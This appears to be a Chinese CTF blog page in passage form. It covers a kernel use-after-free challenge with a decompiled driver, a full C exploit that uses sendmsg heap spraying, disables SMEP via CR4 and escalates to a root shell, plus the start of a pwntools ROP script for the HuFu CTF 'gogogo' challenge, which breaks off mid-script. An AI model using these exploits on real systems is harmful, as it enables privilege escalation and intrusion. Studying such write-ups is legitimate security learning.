<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_0</span><span class="params">(__int64 a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v3; <span class="comment">// r13</span></span><br><span class="line">  __int64 v4; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v6; <span class="comment">// rax</span></span><br><span class="line">  __int64 v7; <span class="comment">// r12</span></span><br><span class="line">  __int64 v8; <span class="comment">// rax</span></span><br><span class="line">  __int64 v9; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v10; <span class="comment">// rax</span></span><br><span class="line">  __int64 v11; <span class="comment">// rsi</span></span><br><span class="line">  __int64 v12; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  _fentry__();</span><br><span class="line">  v3 = v2;</span><br><span class="line">  v4 = kmem_cache_alloc_trace(kmalloc_caches[<span class="number">4</span>], <span class="number">6291648LL</span>, <span class="number">16LL</span>);</span><br><span class="line">  copy_from_user(v4, v3, <span class="number">16LL</span>);</span><br><span class="line">  <span class="keyword">switch</span> ( a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">24584</span>:</span><br><span class="line">      v12 = *(<span class="keyword">int</span> *)(v4 + <span class="number">8</span>);</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v12 &lt;= <span class="number">0x1F</span> &amp;&amp; qword_6C0[v12] )</span><br><span class="line">        ((<span class="keyword">void</span> (*)(<span class="keyword">void</span>))kfree)();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">24585</span>:</span><br><span class="line">      v10 = *(<span class="keyword">int</span> *)(v4 + <span class="number">8</span>);</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v10 &lt;= <span class="number">0x1F</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v11 = qword_6C0[v10];</span><br><span class="line">        <span class="keyword">if</span> ( v11 )</span><br><span class="line">          (*(<span class="keyword">void</span> (__fastcall **)(_QWORD, __int64, __int64))(v11 + <span class="number">64</span>))(*(_QWORD *)(v11 + <span class="number">56</span>), v11, <span class="number">72LL</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">24583</span>:</span><br><span class="line">      v6 = <span class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v7 = (<span class="keyword">int</span>)v6;</span><br><span class="line">        <span class="keyword">if</span> ( !qword_6C0[v6] )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> ( ++v6 == <span class="number">32</span> )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_4;</span><br><span class="line">      &#125;</span><br><span class="line">      v8 = kmem_cache_alloc_trace(kmalloc_caches[<span class="number">1</span>], <span class="number">6291648LL</span>, <span class="number">72LL</span>);</span><br><span class="line">      v9 = *(_QWORD *)v4;</span><br><span class="line">      qword_6C0[v7] = v8;</span><br><span class="line">      *(_QWORD *)(v8 + <span class="number">64</span>) = &amp;copy_to_user;</span><br><span class="line">      *(_QWORD *)(v8 + <span class="number">56</span>) = v9;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_4:</span><br><span class="line">  kfree(v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现会申请72字节，根据上一篇slub的分析可知，申请72字节的话其实会分配给你96字节的，也就是0x60,申请完在这个堆里填入一个函数地址然后后面会调用这个地址，所以如果能覆盖这个地址就能拿到程序流了，后面free这个堆的时候没有清除指针，存在uaf,所以可以利用堆喷申请内核堆，申请0x10000肯定能申请到刚才free的堆，然后把那个堆的函数指针覆盖就可以了,这里采用sendmsg进行堆喷。</p>
<h3 id="0x4-4-exp"><a href="#0x4-4-exp" class="headerlink" title="0x4.4 exp"></a>0x4.4 exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> vmlinux_nokaslr_addr=<span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="keyword">size_t</span> vmlinux_addr=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> commit_creds=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> prepare_kernel_cred=<span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">really_addr</span><span class="params">(<span class="keyword">size_t</span> addr)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> vmlinux_addr+addr-vmlinux_nokaslr_addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">up_power</span><span class="params">()</span></span>&#123;</span><br><span class="line">    (*((<span class="keyword">void</span> (*)(<span class="keyword">char</span> *))commit_creds))((*((<span class="keyword">char</span>* (*)(<span class="keyword">int</span>))prepare_kernel_cred))(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">size_t</span> user_cs,user_ss,user_rflags,user_sp;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_sp,rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">        <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has ben saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">input</span>&#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> *buf;</span><br><span class="line">    <span class="keyword">int</span> idx;</span><br><span class="line">&#125;input;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> fd)</span></span>&#123;</span><br><span class="line">    ioctl(fd,<span class="number">0x6007</span>,&amp;input);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">(<span class="keyword">int</span> fd)</span></span>&#123;</span><br><span class="line">    ioctl(fd,<span class="number">0x6009</span>,&amp;input);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">del</span><span class="params">(<span class="keyword">int</span> fd)</span></span>&#123;</span><br><span class="line">    ioctl(fd,<span class="number">0x6008</span>,&amp;input);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    save_status();</span><br><span class="line">    <span class="keyword">int</span> fd=open(<span class="string">&quot;dev/baby&quot;</span>,<span class="number">0</span>);</span><br><span class="line">    input.buf=(<span class="keyword">size_t</span> *)<span class="built_in">malloc</span>(<span class="number">8</span>*<span class="number">12</span>);</span><br><span class="line">    input.idx=<span class="number">0</span>;</span><br><span class="line">    add(fd);</span><br><span class="line">    show(fd);</span><br><span class="line">    del(fd);</span><br><span class="line">    vmlinux_addr=input.buf[<span class="number">8</span>]<span class="number">-0x4d4680</span>;</span><br><span class="line">    <span class="keyword">size_t</span> mov_cr4_pop_ret=really_addr(<span class="number">0xffffffff81070790</span>);</span><br><span class="line">    commit_creds=really_addr(<span class="number">0xffffffff810b99d0</span>);</span><br><span class="line">    prepare_kernel_cred=really_addr(<span class="number">0xffffffff810b9d80</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">96</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msghdr</span> <span class="title">msg</span>=</span>&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">addr</span>=</span>&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> sockfd=socket(AF_INET,SOCK_DGRAM,<span class="number">0</span>);</span><br><span class="line">    ((<span class="keyword">size_t</span> *)buf)[<span class="number">7</span>]=<span class="number">0x6f0</span>;</span><br><span class="line">    ((<span class="keyword">size_t</span> *)buf)[<span class="number">8</span>]=mov_cr4_pop_ret;</span><br><span class="line">    addr.sin_addr.s_addr=htonl(INADDR_LOOPBACK);</span><br><span class="line">    addr.sin_family=AF_INET;</span><br><span class="line">    addr.sin_port=htons(<span class="number">6666</span>);</span><br><span class="line">    msg.msg_control=buf;</span><br><span class="line">    msg.msg_controllen=<span class="number">96</span>;</span><br><span class="line">    msg.msg_name=(<span class="keyword">caddr_t</span>)&amp;addr;</span><br><span class="line">    msg.msg_namelen=<span class="keyword">sizeof</span>(addr);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x10000</span>;i++)&#123;</span><br><span class="line">        sendmsg(sockfd,&amp;msg,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;cr4:%p/n&quot;</span>,mov_cr4_pop_ret);</span><br><span class="line">    show(fd);</span><br><span class="line">    ((<span class="keyword">size_t</span> *)buf)[<span class="number">8</span>]=(<span class="keyword">size_t</span>)up_power;</span><br><span class="line">    input.idx=<span class="number">1</span>;</span><br><span class="line">    add(fd);</span><br><span class="line">    del(fd);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x10000</span>;i++)&#123;</span><br><span class="line">        sendmsg(sockfd,&amp;msg,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    show(fd);</span><br><span class="line">    <span class="keyword">if</span>(getuid()==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]--getshell ok&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="0x4-5-sendmsg堆喷"><a href="#0x4-5-sendmsg堆喷" class="headerlink" title="0x4.5 sendmsg堆喷"></a>0x4.5 sendmsg堆喷</h3><p>堆喷的简单原理就是在用户态申请n多个内核堆然后然后填入数据，如果ko文件存在uaf的话那就可以利用堆喷拿到被free掉的堆修改其中的内容，进而影响程序执行。</p>
<p>sendmsg首先涉及了两个结构体<code>struct msghdr</code>和<code>struct sockaddr_in </code>首先是<code>sockaddr_in</code>记录了数据包的目的地址和端口号，然后把这个结构体的地址赋值给<code>msghdr.msg_name</code>，把这个结构体的大小赋值给<code>msghdr.msg_namelen</code>,然后把要发送的数据包的地址给<code>msg.msg_control</code>，把数据包的长度传递给<code>msg.msg_controllen</code>,最后调用sendmsg()函数，sendmsg函数的大概过程如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> ___sys_sendmsg(struct socket *sock, struct user_msghdr __user *msg,</span><br><span class="line">             struct msghdr *msg_sys, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags,</span><br><span class="line">             struct used_address *used_address,</span><br><span class="line">             <span class="keyword">unsigned</span> <span class="keyword">int</span> allowed_msghdr_flags)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">compat_msghdr</span> __<span class="title">user</span> *<span class="title">msg_compat</span> =</span></span><br><span class="line">        (struct compat_msghdr __user *)msg;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_storage</span> <span class="title">address</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iovstack</span>[<span class="title">UIO_FASTIOV</span>], *<span class="title">iov</span> =</span> iovstack;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> ctl[<span class="keyword">sizeof</span>(struct cmsghdr) + <span class="number">20</span>]</span><br><span class="line">                __aligned(<span class="keyword">sizeof</span>(<span class="keyword">__kernel_size_t</span>)); <span class="comment">// 创建44字节的栈缓冲区ctl，20是ipv6_pktinfo结构的大小</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *ctl_buf = ctl; <span class="comment">// ctl_buf指向栈缓冲区ctl</span></span><br><span class="line">    <span class="keyword">int</span> ctl_len;</span><br><span class="line">    <span class="keyword">ssize_t</span> err;</span><br><span class="line"></span><br><span class="line">    msg_sys-&gt;msg_name = &amp;address;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (MSG_CMSG_COMPAT &amp; flags)</span><br><span class="line">        err = get_compat_msghdr(msg_sys, msg_compat, <span class="literal">NULL</span>, &amp;iov);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        err = copy_msghdr_from_user(msg_sys, msg, <span class="literal">NULL</span>, &amp;iov); <span class="comment">// 用户数据拷贝到msg_sys，只拷贝msghdr消息头部</span></span><br><span class="line">    <span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">    err = -ENOBUFS;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (msg_sys-&gt;msg_controllen &gt; INT_MAX) <span class="comment">//如果msg_sys小于INT_MAX，就把ctl_len赋值为用户提供的msg_controllen</span></span><br><span class="line">        <span class="keyword">goto</span> out_freeiov;</span><br><span class="line">    flags |= (msg_sys-&gt;msg_flags &amp; allowed_msghdr_flags);</span><br><span class="line">    ctl_len = msg_sys-&gt;msg_controllen;</span><br><span class="line">    <span class="keyword">if</span> ((MSG_CMSG_COMPAT &amp; flags) &amp;&amp; ctl_len) &#123;</span><br><span class="line">        err =</span><br><span class="line">            cmsghdr_from_user_compat_to_kern(msg_sys, sock-&gt;sk, ctl,</span><br><span class="line">                             <span class="keyword">sizeof</span>(ctl));</span><br><span class="line">        <span class="keyword">if</span> (err)</span><br><span class="line">            <span class="keyword">goto</span> out_freeiov;</span><br><span class="line">        ctl_buf = msg_sys-&gt;msg_control;</span><br><span class="line">        ctl_len = msg_sys-&gt;msg_controllen;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ctl_len) &#123;</span><br><span class="line">        BUILD_BUG_ON(<span class="keyword">sizeof</span>(struct cmsghdr) !=</span><br><span class="line">                 CMSG_ALIGN(<span class="keyword">sizeof</span>(struct cmsghdr)));</span><br><span class="line">        <span class="keyword">if</span> (ctl_len &gt; <span class="keyword">sizeof</span>(ctl)) &#123;  <span class="comment">//注意用户数据的size必须大于44字节</span></span><br><span class="line">            ctl_buf = sock_kmalloc(sock-&gt;sk, ctl_len, GFP_KERNEL);<span class="comment">//sock_kmalloc最后会调用kmalloc 分配 ctl_len 大小的堆块</span></span><br><span class="line">            <span class="keyword">if</span> (ctl_buf == <span class="literal">NULL</span>)</span><br><span class="line">                <span class="keyword">goto</span> out_freeiov;</span><br><span class="line">        &#125;</span><br><span class="line">        err = -EFAULT;</span><br><span class="line">        <span class="comment">/* 注意，msg_sys-&gt;msg_control是用户可控的用户缓冲区；ctl_len是用户可控的长度。  用户数据拷贝到ctl_buf内核空间。</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span> (copy_from_user(ctl_buf,</span><br><span class="line">                   (<span class="keyword">void</span> __user __force *)msg_sys-&gt;msg_control,</span><br><span class="line">                   ctl_len))</span><br><span class="line">            <span class="keyword">goto</span> out_freectl;</span><br><span class="line">        msg_sys-&gt;msg_control = ctl_buf;</span><br><span class="line">    &#125;</span><br><span class="line">    msg_sys-&gt;msg_flags = flags;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>可见如果msg.msg_controllen&gt;44就会申请一个msg_controllen大小的堆块，然后把msg_control指向的数据赋值给刚申请的堆块，多次使用sendmsg就能达到堆喷的目的。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/24/%E8%99%8E%E7%AC%A6ctf/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="我的博客">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/03/24/%E8%99%8E%E7%AC%A6ctf/" class="post-title-link" itemprop="url">虎符ctf</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-03-24 23:15:28 / 修改时间：23:15:55" itemprop="dateCreated datePublished" datetime="2022-03-24T23:15:28+08:00">2022-03-24</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="虎符ctf"><a href="#虎符ctf" class="headerlink" title="虎符ctf"></a>虎符ctf</h1><h2 id="gogogo"><a href="#gogogo" class="headerlink" title="gogogo"></a>gogogo</h2><p>主要难点在逆向，代码有一千多行，ida7.7能大致反编译出go的伪代码，但是伪代码中还是有很多意义不明的代码出现，再加上go的函数调用的参数放在父函数的栈上，导致ida对参数的解析比较密，不能很好的看出传入的参数是啥，只能动态调试，最后逆出了最后退出的时候会向栈上写数据且有栈溢出</p>
<p>然后中间还得玩个很复杂的游戏，主要难点就这两个了。</p>
<p>脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">sh=process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x000000000045c849: syscall; ret;</span></span><br><span class="line"><span class="string">0x0000000000405b78: pop rax; ret;</span></span><br><span class="line"><span class="string">0x00000000004742da: pop rdi; xor eax, eax; mov rbp, qword ptr [rsp + 0xb0]; add rsp, 0xb8; ret;</span></span><br><span class="line"><span class="string">0x000000000045544a: pop rsi; add byte ptr [rax], al; mov byte ptr [rax], 1; mov rbp, qword ptr [rsp + 0x10]; add rsp, 0x18; ret;</span></span><br><span class="line"><span class="string">0x000000000048546c: pop rdx; ret;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">bss=<span class="number">0x538000</span>+<span class="number">0x20</span></span><br><span class="line">syscall_ret=<span class="number">0x000000000045c849</span></span><br><span class="line">pop_rax_ret=<span class="number">0x0000000000405b78</span></span><br><span class="line">rdi=<span class="number">0x00000000004742da</span></span><br><span class="line">rsi=<span class="number">0x000000000045544a</span></span><br><span class="line">rdx=<span class="number">0x000000000048546c</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span>(<span class="params">content</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;(4) EXIT&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;ARE YOU SURE?&quot;</span>)</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    sh.sendline(content)</span><br><span class="line"><span class="comment">#gdb.attach(sh,&#x27;b *0x48EEA0&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">game</span>():</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;YOU HAVE SEVEN CHANCES TO GUESS\n&quot;</span>)</span><br><span class="line">    guess=<span class="string">&#x27;3 2 1 0&#x27;</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">        sh.sendline(guess)</span><br><span class="line">        ans=sh.recvline()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;WIN&#x27;</span> <span class="keyword">in</span> ans:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        s=<span class="built_in">str</span>(<span class="built_in">input</span>(<span class="string">&#x27;guess:&#x27;</span>))</span><br><span class="line">        guess=s[<span class="number">0</span>]+<span class="string">&#x27; &#x27;</span>+s[<span class="number">1</span>]+<span class="string">&#x27; &#x27;</span>+s[<span class="number">2</span>]+<span class="string">&#x27; &#x27;</span>+s[<span class="number">3</span>]</span><br><span class="line">        <span class="built_in">print</span> guess</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;PLEASE INPUT A NUMBER:&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(<span class="number">1717986918</span>))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;PLEASE INPUT A NUMBER:&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(<span class="number">305419896</span>))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;OKAY YOU CAN LEAVE YOUR NAME AND BYE~&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">    game()</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;AGAIN OR 